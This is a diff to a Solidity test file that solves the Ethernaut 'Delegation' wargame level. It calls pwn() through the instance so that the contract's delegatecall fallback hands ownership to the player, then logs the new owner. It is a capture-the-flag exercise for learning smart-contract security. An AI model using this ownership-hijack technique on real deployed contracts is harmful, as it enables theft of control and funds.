@@ -4,7 +4,7 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Delegation} from "src/levels/Delegation.sol";
+import {Delegation, Delegate} from "src/levels/Delegation.sol";
 import {DelegationFactory} from "src/levels/DelegationFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
@@ -55,6 +55,11 @@ contract TestDelegation is Test, Utils {
     /// @notice Test the solution for the level.
     function testSolve() public {
         vm.startPrank(player);
+
+        // Delegate call to transfer ownership to the player.
+        Delegate(address(instance)).pwn();
+        console.log("instance.owner()", instance.owner());
+        console.log("player", player);
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
